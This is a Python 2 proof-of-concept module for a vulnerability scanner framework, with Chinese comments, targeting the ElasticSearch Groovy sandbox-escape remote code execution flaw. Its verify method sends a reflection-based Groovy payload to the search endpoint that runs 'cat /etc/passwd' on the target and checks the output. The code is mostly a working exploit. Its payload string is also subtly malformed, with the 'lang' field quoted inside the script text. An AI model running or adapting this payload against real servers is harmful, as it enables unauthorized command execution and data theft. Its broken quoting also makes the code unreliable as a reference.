# coding: utf-8
import re
import urllib2
import json

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'ElasticSearch_0103'  # 平台漏洞编号，留空
    name = 'ElasticSearch Groovy脚本远程代码执行'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2015-03-05'  # 漏洞公布时间
    desc = '''
    ElasticSearch是一个JAVA开发的搜索分析引擎。2014年，曾经被曝出过一个远程代码执行漏洞（CVE-2014-3120），
    漏洞出现在脚本查询模块，由于搜索引擎支持使用脚本代码（MVEL），作为表达式进行数据操作，
    攻击者可以通过MVEL构造执行任意java代码，后来脚本语言引擎换成了Groovy，
    并且加入了沙盒进行控制，危险的代码会被拦截，结果这次由于沙盒限制的不严格，导致远程代码执行。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ElasticSearch'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1cea00ff-6a5d-40d0-9388-44ae4a92aa2c'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/_search?pretty'
            cs = {
                'size': '1',
                'script_fields':
                    {'iswin':
                        {'script':
                            "java.lang.Math.class.forName(\"java.io.BufferedReader\").\
                            getConstructor(java.io.Reader.class).newInstance(java.lang.\
                            Math.class.forName(\"java.io.InputStreamReader\").getConstructor\
                            (java.io.InputStream.class).newInstance(java.lang.Math.class.forName\
                            (\"java.lang.Runtime\").getRuntime().exec(\"cat /etc/passwd\").getInputStream()))\
                            .readLines()','lang':'groovy"
                         }
                     }
            }
            jdata = json.dumps(cs)
            req = urllib2.urlopen(verify_url, jdata)
            content = req.read()
            if 'root:' in content and 'nobody:' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
